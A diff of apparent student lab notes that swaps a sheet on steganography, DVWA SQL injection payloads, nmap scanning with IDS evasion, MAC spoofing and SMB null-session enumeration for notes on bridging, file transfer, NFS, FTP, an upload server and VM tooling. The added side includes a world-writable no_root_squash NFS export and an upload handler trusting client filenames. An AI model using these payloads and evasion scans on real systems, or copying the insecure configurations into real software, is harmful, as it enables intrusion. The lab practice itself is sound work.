@@ -1,227 +1,211 @@
-from __future__ import annotations
-import numpy as np
-from PIL import Image
-import zlib
-from typing import Optional
+Check interfaces
+ip a
+ip link show
 
-def _bytes_to_bits(data: bytes) -> np.ndarray:
-    return np.unpackbits(np.frombuffer(data, dtype=np.uint8))
-
-def _bits_to_bytes(bits: np.ndarray) -> bytes:
-    if bits.size % 8 != 0:
-        raise ValueError("Bit array length not multiple of 8.")
-    return np.packbits(bits.astype(np.uint8)).tobytes()
-
-def _int_to_u32_be(n: int) -> bytes:
-    return n.to_bytes(4, "big", signed=False)
-
-def _u32_be_to_int(b: bytes) -> int:
-    return int.from_bytes(b, "big", signed=False)
-
-def _xor_keystream(data: bytes, password: str) -> bytes:
-    if not password:
-        return data
-    mask = 0xFFFFFFFF
-    state = zlib.crc32(password.encode("utf-8")) & mask
-    ks = bytearray()
-    for _ in range(len(data)):
-        state = (state ^ ((state << 13) & mask)) & mask
-        state = (state ^ (state >> 17)) & mask
-        state = (state ^ ((state << 5) & mask)) & mask
-        ks.append(state & 0xFF)
-    return bytes(a ^ b for a, b in zip(data, ks))
-
-def _ensure_rgb(img: Image.Image) -> Image.Image:
-    return img if img.mode == "RGB" else img.convert("RGB")
-
-def capacity_bytes(image_path: str) -> int:
-    img = Image.open(image_path)
-    img = _ensure_rgb(img)
-    w, h = img.size
-    return max(0, (w*h*3 - 64)//8)
-
-def embed_text(cover_path: str, stego_path: str, message: str, password: Optional[str] = None) -> None:
-    img = _ensure_rgb(Image.open(cover_path))
-    arr = np.array(img)
-    H, W, C = arr.shape
-    payload = message.encode("utf-8")
-    if password:
-        payload = _xor_keystream(payload, password)
-    length = len(payload)
-    crc = zlib.crc32(payload) & 0xFFFFFFFF
-    header = _int_to_u32_be(length) + _int_to_u32_be(crc)
-    bitstream = _bytes_to_bits(header + payload)
-    if bitstream.size > H*W*3:
-        raise ValueError(f"Payload too large. Max {(H*W*3)//8-8} bytes")
-    flat = arr.reshape(-1).astype(np.uint8)
-    flat[:bitstream.size] = (flat[:bitstream.size] & 0xFE) | bitstream.astype(np.uint8)
-    Image.fromarray(flat.reshape(H, W, 3).astype(np.uint8), "RGB").save(stego_path, format="PNG")
-
-def extract_text(stego_path: str, password: Optional[str] = None) -> str:
-    arr = np.array(_ensure_rgb(Image.open(stego_path)))
-    flat = arr.reshape(-1)
-    header_bits = (flat[:64] & 1).astype(np.uint8)
-    header = _bits_to_bytes(header_bits)
-    length = _u32_be_to_int(header[:4])
-    crc_expected = _u32_be_to_int(header[4:8])
-    payload_bits = (flat[64:64+length*8] & 1).astype(np.uint8)
-    if payload_bits.size != length*8:
-        raise ValueError("Stego image truncated or corrupted.")
-    payload = _bits_to_bytes(payload_bits)
-    if zlib.crc32(payload) & 0xFFFFFFFF != crc_expected:
-        raise ValueError("CRC mismatch: wrong password or corrupted image.")
-    if password:
-        payload = _xor_keystream(payload, password)
-    return payload.decode("utf-8", errors="replace")
-
-if __name__ == "__main__":
-    import argparse, os
-    parser = argparse.ArgumentParser(description="LSB Image Steganography")
-    sub = parser.add_subparsers(dest="cmd", required=True)
-    p_cap = sub.add_parser("capacity")
-    p_cap.add_argument("image")
-    p_embed = sub.add_parser("embed")
-    p_embed.add_argument("cover")
-    p_embed.add_argument("output")
-    p_embed.add_argument("text")
-    p_embed.add_argument("--password", default=None)
-    p_extract = sub.add_parser("extract")
-    p_extract.add_argument("stego")
-    p_extract.add_argument("--password", default=None)
-    args = parser.parse_args()
-    if args.cmd == "capacity":
-        print(capacity_bytes(args.image))
-    elif args.cmd == "embed":
-        _, ext = os.path.splitext(args.output.lower())
-        if ext not in (".png", ".bmp"):
-            raise SystemExit("Output must be .png or .bmp")
-        embed_text(args.cover, args.output, args.text, args.password)
-        print(f"Embedded: {args.output}")
-    elif args.cmd == "extract":
-        try:
-            print(extract_text(args.stego, args.password))
-        except Exception as e:
-            print("Error:", e)
-# Open in browser:
-http://<DVWA_HOST>/dvwa/vulnerabilities/sqli/
-
-# Basic confirm:
-1 OR 1=1
-
-# Error fingerprint:
-'            (single quote)
-
-# Comment terminator (MySQL):
---  (use trailing space: -- )
-
-# Example payloads to paste into ID field and Submit:
-1' OR '1'='1' -- -
-1' UNION SELECT NULL, version() -- -
-1' UNION SELECT NULL, database() -- -
-1 ORDER BY 1
-1 ORDER BY 2
-# Use ORDER BY n to discover column count
-
-# UNION probe example (if 3 columns):
-1' UNION SELECT 'a',NULL,NULL -- -
-1' UNION SELECT NULL,'a',NULL -- -
-# Replace 'a' to find reflected column(s)
-
-# URL-encoded (curl) examples:
-curl "http://<DVWA_HOST>/dvwa/vulnerabilities/sqli/?id=1%20OR%201=1"
-curl "http://<DVWA_HOST>/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20NULL,version()--%20-"
-
-nmap -sn -PE 192.168.56.0/24 — ICMP Echo ping sweep (basic host discovery)
-nmap -sn -PP 192.168.56.0/24 — ICMP Timestamp ping (alternate ICMP probe)
-nmap -sn -PM 192.168.56.0/24 — ICMP Netmask ping (request netmask reply)
-nmap -sn -PS22,80,443 192.168.56.0/24 — TCP SYN probes to ports 22/80/443 (find hosts that block ICMP)
-sudo nmap -sn -PU53,161 192.168.56.0/24 — UDP probes to DNS/SNMP (UDP discovery; slow)
-sudo nmap -sn -PS80,443 -PU53,161 192.168.56.0/24 — Combined TCP+UDP host discovery (max coverage)
-nmap -n -sn 192.168.56.0/24 — Ping sweep no DNS (faster; skip reverse lookups)
-
-nmap -sT 10.0.2.15 — TCP connect (full-open) scan (no raw sockets)
-sudo nmap -sS 10.0.2.15 — TCP SYN (half-open) scan — stealthier, faster
-sudo nmap -sS -f 10.0.2.15 — SYN scan with fragmentation (evade naive IDS)
-sudo nmap -sS -D RND:5 10.0.2.15 — SYN scan with random decoys (confuse logs)
-nmap -b ftp.relay.example:anonymous@domain.com 10.0.2.15 — FTP bounce scan via relay (legacy; rarely works)
-sudo nmap -A 10.0.2.15 — Aggressive (OS, versions, scripts, traceroute) — noisy
-
-nmap -sV 10.0.2.15 — Service/version detection (banner + fingerprint)
-sudo nmap -O 10.0.2.15 — OS detection (fingerprinting; may need root)
-nmap -p 21,22,80,443 -sV 10.0.2.15 — Scan specific ports and detect versions (faster)
-
-nmap --script-help http-enum — Show what an NSE script does and its args
-sudo nmap --script-trace --script http-enum -p80 10.0.2.15 — Trace socket activity of script (debug)
-nmap --reason -p80,443 10.0.2.15 — Show the reason Nmap decided a port state (probe that caused it)
-nmap --script-updatedb — Update local NSE script database after changes
-
-sudo nmap -sS -n -p21,22,80,443 10.0.2.15 — Recommended quick external test: SYN scan, no DNS, target critical ports
-Script Name Vulnerability Type Identified
-http-enum Enumeration of web directories; reveals hidden or sensitive web
-paths
-http-vuln-cve2017-
-5638
-Apache Struts Remote Code Execution (CVE-2017-5638)
-http-dombased-xss DOM-based Cross-Site Scripting (XSS) vulnerabilities
-http-sql-injection SQL Injection flaws in web applications
-http-shellshock Shellshock vulnerability in CGI scripts
-smb-vuln-ms17-010 EternalBlue SMB Remote Code Execution vulnerability
-smb-os-discovery OS version disclosure via SMB protocol
-smb-enum-shares Enumeration of SMB shares; can reveal sensitive shares
-smb-security-mode Detection of weak SMB security configurations
-smb-vuln-cve-2017-
-7494
-Samba remote code execution vulnerability
-ftp-anon Checks for anonymous FTP login enabled
-ftp-vsftpd-backdoor vsFTPd backdoor detection
-ftp-syst FTP server system information disclosure
-ftp-bounce FTP bounce attack vulnerability
-ssl-enum-ciphers Weak or outdated SSL/TLS cipher suites
-mysql-emptypassword
-MySQL accounts with empty passwords
-dns-zone-transfer Misconfigured DNS servers allowing zone transfers
-telnet-encryption Lack of
+Persistent Bridge (Netplan)
+sudo nano /etc/netplan/01-bridge.yaml
+sudo netplan apply
+ip a
+brctl show
+ping 8.8.8.8
 
 
-# 1) Check current MAC / interface info
-ifconfig eth0                # or: ip link show eth0
+network:
+  version: 2
+  renderer: networkd
+  ethernets:
+    enp0s3:
+      dhcp4: no
+  bridges:
+    br-cloud:
+      interfaces: [enp0s3]
+      dhcp4: no
+      addresses: [10.184.61.8/24]
+      gateway4: 10.184.61.1
+      nameservers:
+        addresses: [8.8.8.8,8.8.4.4]
 
-# 2) Bring interface down
-sudo ifconfig eth0 down      # or: sudo ip link set eth0 down
+Temporary Bridge (Manual Commands)
+sudo -i
+ip link set dev enp0s3 down
+ip link add name br-cloud type bridge
+ip link set dev enp0s3 master br-cloud
+ip addr flush dev enp0s3
+ip addr add 10.184.61.9/24 dev br-cloud
+ip link set dev enp0s3 up
+ip link set dev br-cloud up
+ip route add default via 10.184.61.1 dev br-cloud
+ip a
+brctl show
+ping 8.8.8.8
 
-# 3) Change MAC address randomly
-sudo macchanger -r eth0      # -r = random
+Check file & IP (on source)
+ls -l /home/nivi/Desktop/file.txt
+ip a
 
-# 4) Bring interface up
-sudo ifconfig eth0 up        # or: sudo ip link set eth0 up
+Test SSH (from source or any client)
+ssh msfadmin@192.168.56.106
 
-# 5) Verify current MAC
-macchanger -s eth0           # shows current/permanent MAC
-# or: ifconfig eth0 | grep -i ether
+PUSH (run on source) → copy file to target
+scp /home/nivi/Desktop/file.txt msfadmin@192.168.56.106:/home/msfadmin/
+
+scp -r /home/nivi/Desktop/myfolder msfadmin@192.168.56.106:/home/msfadmin/
+
+scp nivi@<SOURCE_IP>:/home/nivi/Desktop/file.txt /home/msfadmin/
+
+vm-1sudo apt update
+sudo apt install nfs-kernel-server
+sudo mkdir -p /srv/nfs_share
+sudo chown nobody:nogroup /srv/nfs_share
+sudo chmod 777 /srv/nfs_share
+echo "/srv/nfs_share 192.168.56.0/24(rw,sync,no_root_squash,no_subtree_check)" | sudo tee -a /etc/exports
+sudo exportfs -a
+sudo systemctl restart nfs-kernel-server
+vm-2sudo apt install nfs-common
+sudo mkdir -p /mnt/nfs
+sudo mount 192.168.56.101:/srv/nfs_share /mnt/nfs
+cp ~/Desktop/file.txt /mnt/nfs
+
+sudo umount /mnt/nfs
+
+ftp server -sudo apt update
+sudo apt install vsftpd
+sudo systemctl enable vsftpd
+sudo systemctl start vsftpd
+sudo adduser ftpuser
+sudo passwd ftpuser
+sudo mkdir -p /home/ftpuser/files
+sudo chown ftpuser:ftpuser /home/ftpuser/files
+client- sudo apt install ftp
+ftp 192.168.56.101
+# login as ftpuser
+put ~/Desktop/file.txt   # upload file to server
+get file.txt             # download file from server
+bye
+
+hhtp-cd /path/to/files
+python3 -m http.server 8000
+client import urllib.request
+
+url = "http://192.168.56.101:8000/file.txt"
+destination = "/home/nivi/Desktop/file.txt"
+
+urllib.request.urlretrieve(url, destination)
+
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import cgi
+
+class UploadHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'''<html><body>
+            <form enctype="multipart/form-data" method="post">
+            <input name="file" type="file"/>
+            <input type="submit"/>
+            </form></body></html>''')
+
+    def do_POST(self):
+        form = cgi.FieldStorage(
+            fp=self.rfile,
+            headers=self.headers,
+            environ={'REQUEST_METHOD':'POST'}
+        )
+        fileitem = form['file']
+        open(fileitem.filename, 'wb').write(fileitem.file.read())
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"File uploaded successfully")
+
+server = HTTPServer(('0.0.0.0', 8000), UploadHandler)
+server.serve_forever()
 
 
-# null session (anonymous) RPC connection
-rpcclient -U "" 192.168.1.10
-# then at rpcclient> prompt try commands:
+MicroStack OpenStack Cheat Sheet
+Install MicroStack
+sudo snap install microstack --classic
+sudo microstack init --auto --control
 
-rpcclient $> enumdomusers
-rpcclient $> queryuser <rid>        # inspect a user by RID
-rpcclient $> getdompwinfo           # password policy
-rpcclient $> srvinfo                # service info
-
-# run a single command non-interactively:
-rpcclient -U "" 192.168.1.10 -c "enumdomusers"
+Source admin credentials
+source /var/snap/microstack/common/etc/microstack.rc
 
 
-enum4linux -a 192.168.1.10
-# -a = run all checks: users, shares, groups, policies, OS, etc.
+Admin credentials: Username: admin
 
-enum4linux -U 192.168.1.10
-# list users
+Password: from microstack.rc
 
-enum4linux -S 192.168.1.10
-# list shares
+Project: admin
 
-enum4linux -o 192.168.1.10
-# show domain info / OS details (depends on version)
+Upload Image
+wget https://cloud-images.ubuntu.com/jammy/current/jammy-server-cloudimg-amd64.img
+openstack image create ubuntu --file jammy-server-cloudimg-amd64.img --disk-format qcow2 --container-format bare --public
 
+Create Flavor
+openstack flavor create m1.small --ram 1024 --disk 10 --vcpus 1
+
+ Create Network & Router
+openstack network create net1
+openstack subnet create --network net1 --subnet-range 192.168.10.0/24 subnet1
+openstack router create router1
+openstack router set router1 --external-gateway ext-net
+openstack router add subnet router1 subnet1
+
+ Keypair & Security Rules
+openstack keypair create mykey > mykey.pem
+chmod 600 mykey.pem
+openstack security group rule create --proto icmp default
+openstack security group rule create --proto tcp --dst-port 22 default
+
+ Launch VM
+openstack server create vm1 --image ubuntu --flavor m1.small --key-name mykey --network net1
+
+Assign Floating IP
+openstack floating ip create ext-net
+openstack server add floating ip vm1 <FLOATING_IP>
+
+ List / Show / Delete VMs
+openstack server list
+openstack server show vm1
+openstack server delete vm1
+
+ Access GUI (Horizon)
+# GUI URL
+https://<your-host-IP>
+# Login
+Username: admin
+Password: (from microstack.rc)
+Project: admin
+
+ Cleanup Network & Image
+openstack router remove subnet router1 subnet1
+openstack router delete router1
+openstack subnet delete subnet1
+openstack network delete net1
+openstack image delete ubuntu
+
+
+
+
+egrep -c '(vmx|svm)' /proc/cpuinfo
+sudo apt update
+sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils virt-manager
+sudo systemctl enable libvirtd
+sudo systemctl start libvirtd
+virsh list --all
+virt-manager
+
+qemu-img create -f qcow2 ~/VM_images/ubuntu.qcow2 20G
+qemu-img resize ~/VM_images/ubuntu.qcow2 40G
+sudo resize2fs /dev/sda
+qemu-img convert -f vhd -O qcow2 ~/VM_images/ubuntu.vhd ~/VM_images/ubuntu.qcow2
+qemu-img convert -f raw -O qcow2 source.img dest.qcow2
+
+
+
+New-VM -Name "MyNewVM" -MemoryStartupBytes 4GB -NewVHDPath "C:\VMs\MyNewVM.vhdx" -NewVHDSizeBytes 60GB -SwitchName "Default Switch"
+Stop-VM -Name "MyNewVM" -Force
+Remove-VM -Name "MyNewVM" -Force -DeleteVHD
+Start-VM -Name "MyNewVM"
+Set-VM -Name "MyNewVM" -MemoryStartupBytes 8GB
+
+Get-VM -Name "MyNewVM"
